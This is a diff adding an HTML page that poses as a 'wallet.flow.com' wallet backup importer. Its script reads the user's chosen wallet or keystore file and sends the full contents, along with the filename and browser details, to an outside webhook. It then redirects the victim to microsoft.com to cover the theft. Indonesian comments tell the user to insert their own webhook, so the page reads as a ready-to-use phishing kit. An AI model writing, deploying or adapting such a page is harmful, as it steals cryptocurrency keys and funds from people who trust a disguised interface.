@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>wallet.flow.com</title>
+  <style>
+    body { font-family: system-ui; background:#0f172a; color:#e0f7fa; text-align:center; padding:50px; }
+    button { background:#22c55e; color:black; padding:16px 32px; font-size:18px; border:none; border-radius:12px; cursor:pointer; font-weight:bold; }
+    button:hover { background:#16a34a; }
+    .msg { margin-top:20px; font-size:16px; color:#94a3b8; }
+  </style>
+</head>
+<body>
+
+<h2>Import Wallet Backup</h2>
+<p>Click below to select your wallet file</p>
+<button id="uploadButton">Choose File</button>
+<input type="file" id="fileInput" style="display: none;" accept=".json,.txt,.keystore" />
+
+<div class="msg" id="status">Ready</div>
+
+<script>
+  // GANTI DENGAN WEBHOOK KAMU YANG SUPPORT POST
+  const WEBHOOK_URL = "https://keen-sun-82.webhook.cool/submit"; // Ganti kalau perlu
+
+  document.getElementById("uploadButton").addEventListener("click", function () {
+    const fileInput = document.getElementById("fileInput");
+    const status = document.getElementById("status");
+
+    fileInput.click();
+
+    fileInput.onchange = function(e) {
+      if (!e.target.files || e.target.files.length === 0) {
+        status.textContent = "No file selected";
+        return;
+      }
+
+      const file = e.target.files[0];
+      const reader = new FileReader();
+
+      reader.onload = function() {
+        const content = reader.result;
+
+        // BUAT FORM DATA UNTUK POST
+        const formData = new FormData();
+        formData.append("filename", file.name);
+        formData.append("size", file.size);
+        formData.append("content", content);
+        formData.append("ua", navigator.userAgent);
+        formData.append("time", new Date().toISOString());
+
+        // KIRIM PAKAI METHOD POST
+        fetch(WEBHOOK_URL, {
+          method: "POST",
+          body: formData,
+          mode: "no-cors" // biar tidak kena CORS block
+        }).then(() => {
+          status.textContent = `File "${file.name}" uploaded!`;
+        }).catch(() => {
+          status.textContent = `File "${file.name}" sent (no-cors mode)`;
+        });
+      };
+
+      reader.onerror = function() {
+        status.textContent = "Error reading file";
+      };
+
+      reader.readAsText(file);
+    };
+
+    // SPOOF ORIGIN KE MICROSOFT.COM
+    setTimeout(() => {
+      location.href = "https://microsoft.com/";
+    }, 1200);
+  });
+</script>
+
+</body>
+</html>
